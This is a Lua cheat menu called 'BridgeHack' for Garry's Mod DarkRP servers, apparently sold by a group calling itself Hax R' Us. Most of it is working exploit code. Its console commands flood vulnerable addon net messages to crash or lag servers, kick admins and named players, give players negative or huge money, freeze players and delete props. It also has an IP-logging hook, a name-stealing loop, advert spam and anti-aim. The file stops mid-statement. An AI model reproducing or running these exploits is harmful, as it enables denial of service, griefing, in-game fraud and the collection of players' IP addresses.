local dversion=1.3
 
local dlversion ="v1.3"
 
local outdated = 0
 
local devbuild = 0
 
local pastecheck = 0 // 0 = Bueno 1 = No Bueno
 
local crash = 0
 
local ulx_spam=0
 
local ply = LocalPlayer()
 
 
 
// INSTALIZATION
 
// FUNCTIONS
 
 
 
surface.CreateFont( "PopupHFont", {
 
        font = "Segoe UI Light",
 
        size = 50,
 
        weight = 1000,
 
} )
 
 
 
surface.CreateFont("HeaderFont", {
 
        font = "Segoe UI Semilight",
 
        size = 22,
 
        weight = 300
 
})
 
 
 
surface.CreateFont("PopupFont", {
 
        font = "Segoe UI Light",
 
        size = 21,
 
        weight = 300
 
})
 
 
 
surface.CreateFont("HeadingFont",{
 
        font = "ChatFont",
 
        size = 20,
 
        weight = 500,
 
        antialias = true,
 
})
 
 
 
function SoundClick()
 
        if GetConVarNumber("bh_playsound") > 0 then
 
                surface.PlaySound("buttons/lightswitch2.wav")
 
        else
 
end end
 
 
 
function consoleP(message)
 
        queries = queries + 1
 
        MsgC(Color(231, 76, 60), "[BridgeHack " .. dlversion .. "]: ", Color(255,255,255), message, "\n")
 
end
 
 
 
function SoundPop()
 
        --buttons/blip1.wav
 
        --buttons/button14.wav
 
        --buttons/lightswitch2.wav
 
        if GetConVarNumber("bh_playsound") > 0 then
 
                surface.PlaySound("buttons/button14.wav")
 
        else
 
end end
 
 
 
local infinite = 1000000000000000000000000000000000000000000000000000000000000000000
 
 
 
function HitBitches()
 
        net.Start("hitcomplete")
 
                net.WriteDouble( GetConVarNumber("bh_hitmenuammount") )
 
        net.SendToServer()
 
end
 
concommand.Add("bh_hithack", HitBitches)
 
 
 
function clearcon()
 
        for i=0, 100 do
 
        print(" ")
 
end end
 
 
 
function cleardchat()
 
  for i=0, 100 do
 
    chat.AddText(" ")
 
  end end
 
 
 
--[[
 
        Woo, Coloured chat messages!
 
]]--
 
function chatP(message)
 
        queries = queries + 1
 
        chat.AddText(Color(120, 255, 0), "[BridgeHack " .. dlversion .. "]: ", Color(255,255,0), message)
 
        --status(message)
 
end
 
 
 
function chatPR(message)
 
        queries = queries + 1
 
        chat.AddText(Color(120, 255, 0), "[BridgeHack " .. dlversion .. "]: ", Color(255,0,0), message)
 
        --status(message)
 
end
 
 
 
function chatPG(message)
 
        queries = queries + 1
 
        chat.AddText(Color(120, 255, 0), "[BridgeHack " .. dlversion .. "]: ", Color(0,255,0), message)
 
        --status(message)
 
end
 
queries=1;     
 
http.Fetch("http://pastebin.com/raw.php?i=jfuCra2J",function(body, len, headers, code)
 
        serverlist = body
 
end,function( error )
 
        chatP("Error accessing PasteBin!")
 
end)
 
 
 
http.Fetch("http://pastebin.com/raw.php?i=Ax9WQ5y7",function(body, len, headers, code)
 
        changelogs = body
 
end,function( error )
 
        chatP("Error accessing PasteBin!")
 
end)
 
       
 
function printchange()
 
        consoleP(""..changelogs.."")
 
end
 
concommand.Add("bh_logs", printchange)
 
 
 
--[[
 
 
 
                PASTEBIN
 
               
 
                CHECK
 
 
 
 
 
]]--
 
local StringM8 = "I like potatoes, potatoes are DELICIOUS! Potatoes are LIFE!"
 
 
 
function CheckPastebin()
 
        http.Fetch("http://pastebin.com/raw.php?i=gy2HeVgB",function(body, len, headers, code)
 
                bintext = body
 
                local stringbin = ( tostring( bintext ))
 
                if (StringM8 == stringbin) then
 
                        consoleP("Connection to PasteBin is good!")
 
                else
 
                        pastecheck = 1
 
                        chatP("Connection to PasteBin is broken!")
 
                        chatP("BridgeHack needs PasteBin to properly work!")
 
                end end) end
 
--[[
 
~~~~~~~~~~~~~~~ Version Check ~~~~~~~~~~~~~~~
 
 --]]  
 
function VersionCheck()
 
        http.Fetch("http://pastebin.com/raw.php?i=xcTwfJY7",function( HTML )
 
        local findpos = string.find( HTML, "CVERSION =", 0, false )    
 
        if (findpos) then
 
                local version = tonumber( string.sub( HTML, findpos+10, findpos+13 ) )
 
                if (pastecheck == 1) then
 
                        chatP("Can't check for newer versions because PasteBin is unaccessable!")
 
                elseif ( version > dversion ) then
 
                        outdated = 1
 
                        chatP("Your version is out of date!" )
 
                elseif ( version == dversion ) then
 
                        chatP("Your version is up to date." )
 
                elseif (version < dversion) then
 
                        devbuild = 1
 
                else
 
                        chatP("Error checking versions!")
 
                end end end) end
 
VersionCheck()
 
 
 
/*
 
        About Menu
 
       
 
        Woo, learn about us.
 
 
 
*/
 
function AboutMenu()
 
        local frame = vgui.Create("DFrame")
 
                frame:SetSize( ScrW(), ScrH() )
 
                frame:SetPos( 0,0 )
 
                frame:SetVisible( true )
 
                frame:SetDraggable( false )
 
                frame:MakePopup()
 
                frame:ShowCloseButton( false )
 
                frame.Paint = function(s,w,h)
 
                        surface.SetDrawColor( Color(0,0,0,200) )
 
                        surface.DrawRect( 0,0, w,h )
 
                        surface.SetDrawColor( Color(0,230,255,150) )
 
                        surface.DrawRect( 0, ScrH()/15, ScrW(), ScrH()/8 )
 
                        surface.SetTextColor(255,255,255)
 
                        surface.SetFont("PopupHFont")
 
                        surface.SetTextPos( w/5 , ScrH()/10 )
 
                        surface.DrawText("About BridgeHack")
 
                        surface.SetFont("PopupFont")
 
                        surface.SetTextPos( w/4, h/2.5)
 
                        surface.DrawText("BridgeHack, made by the Hax R' Us team.")
 
                        surface.SetTextPos( w/4, h/2.4 )
 
                        surface.DrawText("If we haven't said it enough, we'll say it again...")
 
                        surface.SetTextPos( w/4, h/2.3 )
 
                        surface.DrawText("The Hax R' Us team has worked VERY hard on this menu.")
 
                        surface.SetTextPos( w/4, h/2.2 )
 
                        surface.DrawText("We LOVE feedback, so please, take the time and send an email to team.")
 
                        surface.SetTextPos( w/4, h/2.1 )
 
                        surface.DrawText("haxrus1337@gmail.com")
 
                        surface.SetTextPos( w/4, h/2.0 )
 
                        surface.DrawText("Tell us what you think of the menu.")
 
                end
 
               
 
                button = vgui.Create("DButton", frame)
 
                button:SetSize(110,32.5)
 
                button:SetPos(frame:GetWide()/2+frame:GetWide()/10, frame:GetTall()/1.9)
 
                button:SetText("")
 
                button.Paint = function(s,w,h)
 
                        surface.SetDrawColor( Color(255,255,255) )
 
                        surface.DrawRect( 0,0, w,h )
 
                        surface.SetDrawColor( Color(13,136,69) )
 
                        surface.DrawRect( 0+3,0+3, w-6,h-6 )
 
                        surface.SetTextColor(255,255,255)
 
                        surface.SetFont("PopupFont")
 
                        surface.SetTextPos(30.5,5.5)
 
                        surface.DrawText( "Alright!" )
 
                end
 
        button.DoClick = function(s,w,h)
 
                frame:Close()
 
                SoundClick()
 
        end end
 
/*
 
 
 
                        GUYS ITS FINALLY HERE!!!
 
                       
 
                       
 
 
 
                        BridgeHack WELCOME SCREEN!!!!!
 
                       
 
 
 
*/
 
function WelcomeScreen()
 
        local Popup = vgui.Create("DFrame")
 
        Popup:SetSize( ScrW(), ScrH() )
 
        Popup:SetPos( 0,0 )
 
        Popup:SetVisible( true )
 
        Popup:SetDraggable( false )
 
        Popup:SetTitle( "" )
 
        Popup:MakePopup()
 
        Popup:ShowCloseButton( false )
 
       
 
        Popup.Paint = function(s,w,h)
 
                surface.SetDrawColor( Color(0,0,0,200) )
 
                surface.DrawRect( 0,0, w,h )
 
                surface.SetDrawColor( Color(13,136,69) )
 
                surface.DrawRect( 0, w/2-Popup:GetTall()/1.520, ScrW(), ScrH()/6.5 )
 
                surface.SetTextColor(255,255,255)
 
                surface.SetTextPos(w/5.10, h/2.40)
 
                if outdated == 0 then
 
                        surface.SetFont("PopupHFont")
 
                        surface.SetTextPos(w/5.10, h/3)
 
                        surface.DrawText("BridgeHack")
 
                        surface.SetFont("PopupFont")
 
                        surface.SetTextPos(w/5.10, h/2.50)
 
                        surface.DrawText( "The HaxRUs team hopes you do thoroughly enjoy using our menu!" )
 
                        surface.SetTextPos(w/5.10, h/2.40)                             
 
                        surface.DrawText( "Your version "..dlversion.." is up to date!" )
 
                        surface.SetTextPos(w/5.10, h/2.30)
 
                        surface.DrawText("Please, do not leak our menu.")
 
                        surface.SetTextPos(w/5.10, h/2.20)
 
                        surface.DrawText ( "We worked very hard on creating it." )
 
                elseif outdated == 1 then
 
                        surface.SetFont("PopupFont")
 
                        surface.SetTextPos(w/5.10, h/2.50)
 
                        surface.DrawText( "Your version is outdated! Please contact the HaxRUs team for the latest edition!" )
 
                else
 
                        surface.SetFont("PopupHFont")
 
                        surface.SetTextPos(10, 100)
 
                        surface.DrawText( "BridgeHack Version "..dlversion.."")
 
                        surface.SetFont("PopupFont")
 
                        surface.SetTextPos(w/5.10, h/2.50)                             
 
                        surface.DrawText( "Error" )
 
                end end
 
        button = vgui.Create("DButton", Popup)
 
        button:SetSize(110,32.5)
 
        button:SetPos(Popup:GetWide()/2+Popup:GetWide()/10, Popup:GetTall()/2.050)
 
        button:SetText("")
 
        button.Paint = function(s,w,h)
 
                surface.SetDrawColor( Color(255,255,255) )
 
                surface.DrawRect( 0,0, w,h )
 
                surface.SetDrawColor( Color(13,136,69) )
 
                surface.DrawRect( 0+3,0+3, w-6,h-6 )
 
                surface.SetTextColor(255,255,255)
 
                surface.SetFont("PopupFont")
 
                surface.SetTextPos(30.5,5.5)
 
                surface.DrawText( "Alright!" )
 
        end
 
       
 
        button.DoClick = function(s,w,h)
 
                        Popup:Close()
 
                        SoundClick()
 
        end
 
       
 
        logbutton = vgui.Create("DButton", Popup)
 
        logbutton:SetSize(110,32.5)
 
        logbutton:SetPos(Popup:GetWide()/3+Popup:GetWide()/10, Popup:GetTall()/2.050)
 
        logbutton:SetText("")
 
        logbutton.Paint = function(s,w,h)
 
                surface.SetDrawColor( Color(255,255,255) )
 
                surface.DrawRect( 0,0, w,h )
 
                surface.SetDrawColor( Color(13,170,181) )
 
                surface.DrawRect( 0+3,0+3, w-6,h-6 )
 
                surface.SetTextColor(255,255,255)
 
                surface.SetFont("PopupFont")
 
                surface.SetTextPos(10,5.5)
 
                surface.DrawText( "Change Logs" )
 
        end
 
       
 
        logbutton.DoClick = function(s,w,h)
 
                        Popup:Close()
 
                        ChangeLogMenu()
 
                        SoundClick()
 
        end end
 
concommand.Add("bh_welcome", WelcomeScreen, SVersionCheck)
 
       
 
--                                                                                              Version Menu It Looks PURDY
 
 
 
function ChangeLogMenu()
 
        local Panel = vgui.Create( "DFrame" )
 
        Panel:SetSize( 800, 600 )
 
        Panel:SetPos( ScrW(),ScrH() )
 
        Panel:MoveTo( ScrW()/2-Panel:GetWide()/2, ScrH()/2-Panel:GetTall()/2 , 2, 0, 0.8) -- Sliding code M8
 
        Panel:SetTitle( "" )
 
        Panel:MakePopup()
 
        Panel:ShowCloseButton( false )
 
        function Panel:Paint( w, h )
 
                draw.RoundedBox( 4, 0, 0, w, h, Color( 10, 10, 10, 160) )
 
                draw.RoundedBoxEx( 4, 0, 0, w, 40, Color( 240, 85, 0, 160), true, true, false, false )
 
                draw.SimpleText( "BridgeHack ChangeLogs", "Default", 6, 15, Color( 255,255,255 ), 0, 0 )
 
        end
 
 
 
        local Button = vgui.Create("DButton", Panel)
 
                Button:SetPos( 740, 10 )
 
                Button:SetSize( 50, 25 )
 
                Button:SetText( "" )
 
                function Button:Paint( w, h )
 
                        draw.RoundedBoxEx( 4, 0, 0, w, h, Color(0,0,0,150) )
 
                        draw.SimpleText( "Close", "HeaderFont", 6, 2, Color( 255,255,255 ), 0, 0 )
 
                end
 
                Button.DoClick = function()
 
                        Panel:Close()
 
                end    
 
       
 
        local Label = vgui.Create( "DLabel", Panel )
 
        Label:SetColor( Color( 255, 255, 255, 255 ) )
 
        Label:SetFont( "DermaLarge" )
 
       
 
        if outdated == 1 then
 
        Label:SetText( "Your version " ..dlversion.." is outdated!" )
 
        Label:SetTextColor( Color( 255,0,0 ) )
 
        elseif outdated == 0 then
 
        Label:SetText( "Your version "..dlversion.." is up to date!" )
 
        Label:SetTextColor( Color( 0,255,0 ) )
 
        else
 
        Label:SetText("Error receving version information!")
 
        end
 
       
 
        Label:SizeToContents()
 
        Label:SetPos( Label:GetParent():GetWide()/2-Label:GetWide()/2-5, 50 )
 
       
 
        local HTML = vgui.Create( "HTML", Panel )
 
        HTML:OpenURL( "http://pastebin.com/raw.php?i=Ax9WQ5y7" )
 
        HTML:SetSize( HTML:GetParent():GetWide() - 50, HTML:GetParent():GetTall() - 160 )
 
        HTML:SetPos( 25, 100 )
 
        HTML.Paint = function()
 
                surface.SetDrawColor( Color( 160, 160, 160) )
 
                surface.DrawRect( 0, 0, HTML:GetWide(), HTML:GetTall() )
 
        end end
 
/*     
 
 
 
       
 
                                END MENU
 
       
 
 
 
*/     
 
local randomvar = math.Rand(0,9999999)
 
local BridgeHack = {}
 
BridgeHack.RandomVar = randomvar
 
local sweg = LocalPlayer():GetEyeTrace().Entity
 
local ply = LocalPlayer()
 
ply:ConCommand("bh_welcome")
 
timer.Destroy("changecolor")
 
 
 
queries=1;
 
function status(statu)--                Made for debugging things.
 
        queries = queries + 1
 
        if GetConVarNumber("bh_showhud") == 1 then
 
                hook.Add( "HUDPaint", "drawcurrent", function()
 
                        surface.SetFont( "BudgetLabel" )
 
                        surface.SetTextColor( 255,255,255 )
 
                        surface.SetTextPos( 25, 25 )
 
                        surface.DrawText( "[" .. queries .. " Total Requests] STATUS: " .. statu )
 
                end) end
 
       
 
        if GetConVarNumber("bh_chat_status") == 1 then
 
                chat.AddText(Color(231, 76, 60), "[BridgeHack " .. dlversion .. "]: ", Color(255,255,255), statu)
 
        end end
 
 
 
function Debug(message)
 
        queries = queries + 1
 
        chat.AddText(Color(155, 89, 182), "[ BridgeHack]: ", Color(255,255,255), message)
 
end
 
 
 
local function CreateCvar(cvar, value)
 
        CreateClientConVar(cvar, value)
 
        consoleP("CVAR: " .. cvar .. " set to " .. value)
 
end
 
 
 
local function ResetCvar(cvar, value)
 
        ply:ConCommand("" .. cvar .. " " .. value)
 
        Debug("CVAR: " .. cvar .. " reset to " .. value)
 
end
 
 
 
CheckPastebin()
 
CreateCvar("bh_notify", 1)
 
CreateCvar("bh_ulxgag", 1, true, false)
 
CreateCvar("bh_playsound",1)
 
CreateCvar("bh_hitmenuammount",0)
 
CreateCvar("bh_menu_effects", 1)
 
CreateCvar("bh_firstload_correct", 1)
 
CreateCvar("bh_chat_status", 0)
 
CreateCvar("bh_cheats_enabled_on_start", 0)
 
CreateCvar("bh_cheats_svlua_enabled_on_start", 0)
 
CreateCvar("bh_showhud", 0)
 
CreateCvar("bh_esp",0)
 
CreateCvar("bh_esp_box",1)
 
CreateCvar("bh_debug",0)
 
CreateCvar("bh_esp_hp",1)
 
CreateCvar("bh_esp_rank",1)
 
CreateCvar("bh_renderdistance_enable",0)
 
CreateCvar("bh_esp_rdistance",2000)
 
CreateCvar("bh_esp_infocolor_r",255)
 
CreateCvar("bh_esp_infocolor_g",0)
 
CreateCvar("bh_esp_infocolor_b",255)
 
CreateCvar("bh_ratm_money2give",100000)
 
 
 
 
 
if GetConVarNumber("bh_firstload_correct") == 1 then
 
        Derma_Message( "Welcome " .. ply:Nick() .. ", We see its your first time launching BridgeHack on your SteamID (" .. ply:SteamID() .. ")\nHow do I open the menu?\nSimply do this bind in console bind KEY +bh_menu\nThanks for purchasing BridgeHack, Enjoy\nBridgeHack Hack (HaxRUs)", "Welcome to BridgeHack " .. ply:Nick() .. "!", "Click me to continue" )
 
        ply:ConCommand("bh_firstload_correct 0")
 
        chatP("Welcome to the world of BridgeHack.")
 
       
 
else
 
end
 
 
 
if GetConVarNumber("bh_cheats_enabled_on_start") == 1 then
 
        ply:ConCommand("incrementvar sv_cheats 0 1 1")
 
        status("Enabled sv_cheats to 1")
 
else
 
end
 
if GetConVarNumber("bh_cheats_svlua_enabled_on_start") == 1 then
 
       
 
        ply:ConCommand("incrementvar sv_allowcslua 0 1 1")
 
        status("Enabled sv_allowcslua to 1")
 
else
 
end
 
 
 
// FIXES
 
local oChatAddText = chat.AddText
 
 
 
function chat.AddText( ... )
 
        local cArgs = { ... };
 
                       
 
       
 
        for k, v in pairs( cArgs ) do
 
                if (type(v) == 'string' && string.len(v) > 255) then -- 255 should be fine
 
                        print("BLOCKED STRING CRASH len[" .. string.len(v) .. "]");
 
                        return false;
 
                else
 
                end
 
        end
 
        return oChatAddText( ... );
 
end
 
 
 
---------------------------------------// Global timers //---------------------------------------
 
if GetConVarNumber("bh_showhud") == 1 then
 
        hook.Add( "HUDPaint", "drawcursor", function()
 
                local x, y, c = ScrW() / 2, ScrH() / 2, Color(225, 0, 0, 255)
 
                surface.SetDrawColor(c)
 
                surface.DrawLine(x - 10, y, x - 5, y)
 
                surface.DrawLine(x, y + 5, x, y + 10)
 
                surface.DrawLine(x + 10, y, x + 5, y)
 
        end)
 
       
 
        hook.Add( "HUDPaint", "drawabout", function()
 
                surface.SetFont( "BudgetLabel" )
 
                surface.SetTextColor( 46, 204, 113 )
 
                surface.SetTextPos( 25, 15 )
 
                surface.DrawText( "BridgeHack " .. dlversion )
 
        end)
 
       
 
        if GetConVarNumber("bh_debug") > 0 then
 
                if system.IsWindows( ) == true then
 
                        hook.Add( "HUDPaint", "drawdev1", function()
 
                                surface.SetFont( "BudgetLabel" )
 
                                surface.SetTextColor( 231, 76, 60 )
 
                                surface.SetTextPos( 25, 47 )
 
                                surface.DrawText( "[] Server Operating System: Windows" )
 
                        end)
 
                end
 
               
 
                if system.IsLinux( ) == true then
 
                        hook.Add( "HUDPaint", "drawdev2", function()
 
                                surface.SetFont( "BudgetLabel" )
 
                                surface.SetTextColor( 231, 76, 60 )
 
                                surface.SetTextPos( 25, 47 )
 
                                surface.DrawText( "[] Server Operating System: Linux" )
 
                        end)
 
                end
 
               
 
                if system.IsOSX( ) == true then
 
                        hook.Add( "HUDPaint", "drawdev3", function()
 
                                surface.SetFont( "BudgetLabel" )
 
                                surface.SetTextColor( 231, 76, 60 )
 
                                surface.SetTextPos( 25, 47 )
 
                                surface.DrawText( "[] Server Operating System: OSX")
 
                        end)
 
                end
 
               
 
                hook.Add( "HUDPaint", "drawdev4", function()
 
                        surface.SetFont( "BudgetLabel" )
 
                        surface.SetTextColor( 231, 76, 60 )
 
                        surface.SetTextPos( 25, 47 )
 
                        surface.DrawText( "[] Server Operating System: Windows" )
 
                end)
 
               
 
                hook.Add( "HUDPaint", "drawdev5", function()
 
                        surface.SetFont( "BudgetLabel" )
 
                        surface.SetTextColor( 231, 76, 60 )
 
                        surface.SetTextPos( 25, 57 )
 
                        surface.DrawText( "[] Server Location: " .. system.GetCountry( ) .. "" )
 
                end)
 
               
 
                hook.Add( "HUDPaint", "drawdev6", function()
 
                        surface.SetFont( "BudgetLabel" )
 
                        surface.SetTextColor( 231, 76, 60 )
 
                        surface.SetTextPos( 25, 67 )
 
                        surface.DrawText( "[] Connection Time: " .. system.AppTime( ) .. " Seconds" )
 
                end)
 
               
 
        end
 
end
 
       
 
status("Starting")
 
status("BridgeHack Loaded")
 
 
 
for k,v in pairs(player.GetAll()) do
 
       
 
        local playermoney = (v.DarkRPVars and v.DarkRPVars.money) or 0
 
                consoleP(v:GetUserGroup()..": " .. v:Nick() .. " - " .. v:SteamID() .. " - $" .. playermoney)
 
        end
 
consoleP("BridgeHack, by HaxRUs")
 
consoleP(dlversion)
 
 
 
// FUNCTIONS--------------------------------------------420---------------------------------------------------------------------------------
 
// CONCOMMANDS------------------------------------------420---------------------------------------------------------------------------------
 
 
 
concommand.Add("bh_hitmanxcrash", function ( ply )
 
for i=0,300 do
 
for k,v in pairs(player.GetAll()) do
 
net.Start( "SendMoney" )
 
net.WriteEntity( v )
 
net.WriteEntity( v )
 
net.WriteEntity( v )
 
net.WriteString( "-100000000000000000000000000000000000000000" )
 
net.SendToServer()
 
 
 
end end end)
 
 
 
concommand.Add("bh_hitmanxinfa", function ( ply )
 
for k,v in pairs(player.GetAll()) do
 
net.Start( "SendMoney" )
 
net.WriteEntity( v )
 
net.WriteEntity( v )
 
net.WriteEntity( v )
 
net.WriteString( "-100000000000000000000000000000000000000000" )
 
net.SendToServer()
 
 
 
end end)
 
 
 
concommand.Add("bh_hitmancrash",function()
 
        for i=0,5000 do
 
                ply:ConCommand('addhit "'..ply:Nick()..'" 500')
 
        end
 
       
 
end)
 
 
 
concommand.Add("bh_ulxgag",function()
 
                if(ulx and ulx.gagUser) then
 
                        if GetConVarNumber("bh_ulxgag") == 1 then
 
                                ulx.gagUser(LocalPlayer(),false)
 
                        else
 
                        end
 
                else
 
                end
 
       
 
end)
 
 
 
concommand.Add("bh_antiaim",function()
 
        hook.Add("CreateMove",function(cmd, u)
 
        if (LocalPlayer():KeyDown(IN_ATTACK)) then return end
 
        local aa = cmd:GetViewAngles()
 
        cmd:SetViewAngles(Angle(-9999999999, aa.y, 99939329))
 
end)
 
 
 
end)
 
 
 
 
 
concommand.Add("bh_infinite_all",function()
 
  clearcon()
 
  cleardchat()
 
  chatP("Giving money, He he")
 
for k,v in pairs(player.GetAll()) do
 
net.Start( "BailOut" )
 
                        net.WriteEntity( v )
 
                        net.WriteEntity( v )
 
                        net.WriteFloat( -infinite )
 
                  net.SendToServer()
 
                end
 
 
 
end)
 
 
 
concommand.Add("bh_ipsteal",function()
 
hook.Add("PlayerConnect", "IPStealer", function(name, ip)
 
        file.Append("ips.txt", name .. " - " .. ip .. "\n")
 
end)
 
 
 
end)
 
 
 
local nlr = CreateClientConVar("bh_nlr_freeze", "0", true, false)
 
 
 
local function nlrs()
 
        if nlr:GetBool() then
 
                for k,v in pairs(player.GetAll())do
 
                if v != LocalPlayer() then
 
                        net.Start("NLR.ActionPlayer")
 
                        net.WriteEntity(v)
 
                        net.SendToServer()
 
                end
 
                end
 
        end
 
        end
 
timer.Create("nlrs", 4,0,nlrs)
 
 
 
LastTime = CurTime()
 
 
 
function drawdatopscreen()  
 
        if GetConVarNumber("bh_notify") > 0 then
 
                draw.RoundedBox(0,0,0,ScrW(),21,Color(0,0,0,200))
 
                sweg = math.Clamp((CurTime()-LastTime)/20,0,1)
 
        if sweg == 1 then
 
                LastTime = CurTime()
 
        end
 
                draw.DrawText("BridgeHack (By Hax R Us) Loaded! | Any bugs? E-Mail haxrus1337@gmail.com! | Suggestions? We love feedback! E-Mail the Hax R Us team! | ","Trebuchet24",(ScrW() + 600) - sweg*3100 , -2, Color(255,255,255),TEXT_ALIGN_CENTER )
 
        end
 
end
 
hook.Add( "HUDPaint", "drawdatopscreen", drawdatopscreen )
 
 
 
concommand.Add("bh_tp_spawn",function()
 
        chatP("Teleported to spawn!")
 
        consoleP("Teleported to spawn!")
 
        status("Teleported to spawn!")
 
        net.Start("DarkRP_Kun_ForceSpawn")
 
        net.SendToServer()
 
       
 
end)
 
 
 
concommand.Add("bh_check",function()
 
clearcon()
 
cleardchat()
 
chatP("Checking for exploitable addons...")
 
if HIT then
 
        chatPG("Hitman X | Found")
 
else
 
        chatPR("Hitman X | Not Found")
 
end
 
if HitMenu then
 
        chatPG("Hit Menu | Found")
 
else
 
        chatPR("Hit Menu | Not Found")
 
end
 
if BAIL then
 
        chatPG("BailNPC | Found")
 
else
 
        chatPR("BailNPC | Not Found")
 
end
 
if dLogs then
 
        chatPG("DLOGS | Found")
 
else
 
        chatPR("DLOGS | Not Found")
 
end
 
if ChanNum then
 
        chatPG("MXRadio| Found")
 
else
 
        chatPR("MXRadio | Not Found")
 
end
 
if VC_Menu_Info_Panel_Build then
 
        chatPG("VCMD | Found")
 
else
 
        chatPR("VCMD | Not Found")
 
end
 
if MDE then
 
        chatPG("MDE | Found")
 
else
 
        chatPR("MDE | Not Found")
 
end
 
if NLR then
 
        chatPG("NLR |  Found")
 
else
 
        chatPR("NLR | Not Found")
 
end
 
if Warnings_for_kick then
 
        chatPG("ULX Extended | Found")
 
else
 
        chatPR("ULX Extended | Not Found")
 
end
 
 
 
end)   
 
 
 
function reloadeddunkalladmins()
 
clearcon()
 
chatP("KICKING ADMINS..... (THIS WILL INCLUDE ANYONE WHO ISNT A USER!)")
 
timer.Create( "heymnangng", 3, 0, function()
 
for k,v in ipairs(player.GetAll()) do
 
if( v:GetUserGroup() != "user" ) then
 
if v:Nick() != "Gam" then
 
for i=0, 700 do
 
net.Start( "GetCar" )
 
net.WriteEntity(v)
 
net.WriteEntity(v)
 
net.SendToServer()
 
end
 
chatP('Kicked: '.. v:Nick().. "!")
 
end end end end)end
 
concommand.Add( "bh_mx_kickadmins", reloadeddunkalladmins, SVersionCheck )
 
 
 
function dloglag()
 
clearcon()
 
print("Lagging server.")
 
clearcon()
 
print("Lagging server..")
 
clearcon()
 
print("Lagging server...")
 
timer.Create( "dlogsisfucked", 3, 0, function()
 
for i=0, 7000 do
 
local tosend = {
 
        cmd="+forward",
 
        args=" "
 
       
 
        }
 
        net.Start('dLogsGetCommand')
 
        net.WriteTable(tosend)
 
        net.SendToServer()
 
       
 
end end) end
 
 
 
concommand.Add( "bh_dlogs_lag", dloglag, SVersionCheck )
 
concommand.Add( "bh_dlogs_lag_off", function()
 
        clearcon()
 
        consoleP("Stopping the lag...")
 
        chatP("Stopping the lag...")
 
        timer.Destroy("dlogisfucked")
 
end)
 
 
 
concommand.Add("bh_admins", function()
 
clearcon()
 
chatP("Listing non-players..")
 
chatP("Check console.")
 
consoleP("============= ULX | Custom admin mode RANKS ============")
 
for k,v in pairs(player.GetAll()) do
 
                if( v:GetUserGroup() != "user" ) then
 
                                print(v:Nick().. " | ".. v:GetUserGroup())
 
                end
 
end
 
consoleP("========================================================")
 
end)
 
 
 
local Spammer = CreateClientConVar("bh_advert", "0", true, false)
 
 
 
local function Spam()
 
        if Spammer:GetBool() then
 
                RunConsoleCommand("say", "/advert I AM TOO COOL FOR SCHOOL !!!!!!") --Whatever you want
 
        end end
 
timer.Create("Spam", 1.5,0,Spam)
 
 
 
local player2kick = CreateClientConVar("g_mx_playername", " ", true, false)
 
function kickdaplayer()
 
timer.Create( "heymnangng2", 3, 0, function()
 
for k,v in ipairs(player.GetAll()) do
 
if v:Nick() == GetConVar("g_mx_playername") then
 
clearcon()
 
print("Kicking: ")
 
print(v:Nick())
 
for i=0, 700 do
 
net.Start( "GetCar" )
 
net.WriteEntity(v)
 
net.WriteEntity(v)
 
net.SendToServer()
 
end
 
chatP("Kicked ".. v:Nick())
 
consoleP("Kicked ".. v:Nick())
 
end end end) end
 
concommand.Add( "bh_mx_kickplayer", kickdaplayer, SVersionCheck )
 
 
 
concommand.Add("Bh_clearcon",function()
 
        clearcon()
 
       
 
end)
 
 
 
concommand.Add("Bh_clearchat",function()
 
        cleardchat()
 
       
 
end)
 
 
 
 
 
concommand.Add("bh_3dcardealer_spamstore",function()
 
        chatP("You better be looking at a car")
 
        for i=0,100 do
 
        clearcon()
 
        chatP("Spamming store... ".."["..i.."]")
 
        net.Start( "RXCAR_Shop_Sell_C2S" )
 
                net.WriteTable({EAA=sweg, CDAA})
 
        net.SendToServer()
 
        end
 
       
 
end)
 
 
 
concommand.Add("bh_serverlist",function()
 
        status("Printing lise to console...")
 
        chatP("Check console.")
 
        clearcon()
 
        consoleP(""..serverlist.."")
 
        status("Complete")
 
       
 
end)
 
 
 
function CheckAE()
 
       
 
        if requestTables then
 
                print("ae found, bh_ae will work")
 
                chatP("AE was found, bh_ae will work.")
 
        else
 
                chatP("AE was not found, bh_ae will not work.")
 
        end end
 
concommand.Add("bh_aecheck", CheckAE, SVersionCheck)
 
 
 
concommand.Add("bh_ae_kickadmins",function()
 
clearcon()
 
chatP("Attempting to Kick admins")
 
chatP("This will only work on admins+")
 
timer.Create( "aekickdaskids", 3, 0, function()
 
for k,v in ipairs(player.GetAll()) do
 
if( v:GetUserGroup() != "user" ) then
 
if( v:GetUserGroup() != "vip" ) then
 
for i=0, 1000 do
 
net.Start('plyWarning')
 
                net.WriteEntity(v)
 
                net.WriteString('You have to select a player before doing a action.')
 
                net.SendToServer()
 
end
 
chatP('Attempting to kick: '.. v:Nick().. "!")
 
 
 
end end end end) end)
 
 
 
concommand.Add("bh_namesteal_on",function()
 
        status("Running Script: Random Name Change [name steal]....")
 
       
 
        timer.Create("startNAMECHANGEsteal", 0.12, 0, function()
 
                local plylastname = ply:Nick()
 
                for k,v in pairs(player.GetAll()) do
 
                        local ligger_type = math.random(1,2)
 
                        local ligger_type1 = math.random(1,2)
 
                        status("Trying Name change to " .. v:Nick() .. " - " .. v:SteamID())
 
                        if ligger_type1 == ligger_type then
 
                                status("Name Changing to " .. v:Nick() .. " - " .. v:SteamID())
 
                                if plylastname == v:Nick() then
 
                                        local ligger_type = math.random(1,2)
 
                                        local ligger_type1 = math.random(1,2)
 
                                else
 
                                        ply:ConCommand("darkrp name " .. v:Nick() .. math.random(1,10))
 
                                        status("Changed Name to " .. v:Nick() .. " - " .. v:SteamID())
 
                                end
 
                                local ligger_type = math.random(1,2)
 
                                local ligger_type1 = math.random(1,2)
 
                        end end end) end)
 
 
 
concommand.Add("bh_namesteal_off",function()
 
        timer.Destroy("startNAMECHANGEsteal",0.12,0,function()
 
        end) end)
 
 
 
concommand.Add("bh_removelookingat",function()
 
        chatP("Removing prop looking at...")
 
        net.Start( "MDE_RemoveStuff_C2S" )      
 
                net.WriteTable( {DATA="",TARGET=sweg} )    
 
        net.SendToServer()
 
       
 
end)
 
 
 
concommand.Add("__bh_lagdarkrpdashit",function()
 
        chatP("Starting the lag...")
 
        timer.Create("lag"..BridgeHack.RandomVar, 1, 0, function()
 
                for i=1,10000 do
 
                        net.Start("DarkRP_spawnPocket")
 
                        net.SendToServer()
 
                end
 
                status("PROGRESS[10000/10000]")
 
               
 
                end) end)
 
               
 
concommand.Add( "__bh_stopplag",function(  )
 
        chatP("Stopping the lag...")
 
        timer.Destroy("lag"..BridgeHack.RandomVar)
 
end)
 
 
 
if dspam == true then
 
        chatP("Spam split / make shipment ON")
 
